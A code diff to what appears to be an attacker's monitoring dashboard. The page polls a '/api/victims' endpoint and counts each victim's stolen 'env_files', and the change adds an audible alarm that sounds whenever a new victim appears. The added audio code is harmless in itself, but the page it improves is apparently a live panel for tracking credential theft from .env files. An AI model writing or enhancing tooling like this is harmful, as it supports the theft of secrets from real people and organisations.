@@ -207,6 +207,22 @@ body{font-family:'JetBrains Mono','Fira Code',monospace;background:#080808;color
 </div>
 <script>
 function esc(s){if(!s)return'-';var d=document.createElement('div');d.textContent=String(s);return d.innerHTML;}
+let actx=null;
+function playAlert(){
+  if(!actx)actx=new(window.AudioContext||window.webkitAudioContext)();
+  const now=actx.currentTime;
+  const master=actx.createGain();master.gain.setValueAtTime(0.35,now);master.gain.linearRampToValueAtTime(0,now+1.8);master.connect(actx.destination);
+  [660,520,440,330].forEach((f,i)=>{
+    const o=actx.createOscillator(),g=actx.createGain();
+    o.type='square';o.frequency.setValueAtTime(f,now+i*0.15);
+    g.gain.setValueAtTime(0.3,now+i*0.15);g.gain.linearRampToValueAtTime(0,now+i*0.15+0.4);
+    o.connect(g);g.connect(master);o.start(now+i*0.15);o.stop(now+i*0.15+0.4);
+  });
+  const sub=actx.createOscillator(),sg=actx.createGain();
+  sub.type='sine';sub.frequency.setValueAtTime(80,now);sub.frequency.linearRampToValueAtTime(40,now+1.5);
+  sg.gain.setValueAtTime(0.4,now);sg.gain.linearRampToValueAtTime(0,now+1.5);
+  sub.connect(sg);sg.connect(master);sub.start(now);sub.stop(now+1.5);
+}
 let seen=0;
 setInterval(async()=>{
   const r=await fetch('/api/victims');
@@ -217,6 +233,7 @@ setInterval(async()=>{
   seen=vs.length;
 },600);
 function render(v){
+  playAlert();
   document.querySelector('.empty')?.remove();
   document.getElementById('nV').textContent=v.id;
   document.getElementById('nE').textContent=parseInt(document.getElementById('nE').textContent)+(v.env_files||[]).length;
